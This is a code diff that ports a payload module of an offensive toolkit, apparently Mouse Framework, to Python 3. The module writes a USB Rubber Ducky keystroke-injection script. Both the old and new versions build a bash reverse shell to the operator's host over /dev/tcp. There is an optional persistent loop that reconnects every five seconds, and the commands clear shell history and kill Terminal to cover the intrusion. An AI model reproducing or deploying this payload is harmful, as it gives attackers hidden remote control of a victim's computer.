@@ -1,7 +1,7 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 
 #            ---------------------------------------------------
-#                              Mouse Framework                                 
+#                              Mouse Framework
 #            ---------------------------------------------------
 #                Copyright (C) <2019-2020>  <Entynetproject>
 #
@@ -22,32 +22,32 @@ from core import helper as h
 import os, time
 
 class payload:
-	def __init__(self):
-		self.name = "Rubber Duck (USB injection)"
-		self.description = "Arduino payload that replicates keystrokes for shell script execution."
-		self.usage = "Install via ducktoolkit.com site."
+    def __init__(self):
+        self.name = "Rubber Duck (USB injection)"
+        self.description = "Arduino payload that replicates keystrokes for shell script execution."
+        self.usage = "Install via ducktoolkit.com site."
 
-	def run(self,server):
-		while 1:
-			persistence = raw_input(h.info_question_raw("Make Persistent? (y/N): ")).lower()
-			if persistence == "y":
-				shell_command = "while true; do $(bash &> /dev/tcp/"+str(server.host)+"/"+str(server.port)+" 0>&1); sleep 5; done & "
-				shell_clean = "history -wc;killall Terminal"
-				break
-			elif persistence == "n" or not persistence:
-				shell_command = "bash &> /dev/tcp/"+str(server.host)+"/"+str(server.port)+" 0>&1;"
-				shell_clean = "history -wc;killall Terminal"
-				break
-			else:
-				h.info_error("Unrecognized option!")
+    def run(self,server):
+        while 1:
+            persistence = input(h.info_question_raw("Make Persistent? (y/N): ")).lower()
+            if persistence == "y":
+                shell_command = "while true; do $(bash &> /dev/tcp/"+str(server.host)+"/"+str(server.port)+" 0>&1); sleep 5; done & "
+                shell_clean = "history -wc;killall Terminal"
+                break
+            elif persistence == "n" or not persistence:
+                shell_command = "bash &> /dev/tcp/"+str(server.host)+"/"+str(server.port)+" 0>&1;"
+                shell_clean = "history -wc;killall Terminal"
+                break
+            else:
+                h.info_error("Unrecognized option!")
 
-		shell_command += "history -wc;killall Terminal"
-		if os.path.exists("payloads") == False:
-			os.mkdir("payloads")
-		if os.path.exists("payloads/rubber_duck") == False:
-			os.mkdir("payloads/rubber_duck")
-		payload_save_path = "payloads/rubber_duck/payload.txt"
-		payload = """\
+        shell_command += "history -wc;killall Terminal"
+        if os.path.exists("payloads") == False:
+            os.mkdir("payloads")
+        if os.path.exists("payloads/rubber_duck") == False:
+            os.mkdir("payloads/rubber_duck")
+        payload_save_path = "payloads/rubber_duck/payload.txt"
+        payload = """\
 DELAY 500
 COMMAND SPACE
 DELAY 500
@@ -60,8 +60,7 @@ DELAY 500
 ENTER
 DELAY 500
 """
-		f = open(payload_save_path,"w")
-		f.write(payload)
-		f.close()
-		h.info_general("Payload saved to " + payload_save_path)
-
+        f = open(payload_save_path,"w")
+        f.write(payload)
+        f.close()
+        h.info_general("Payload saved to " + payload_save_path)
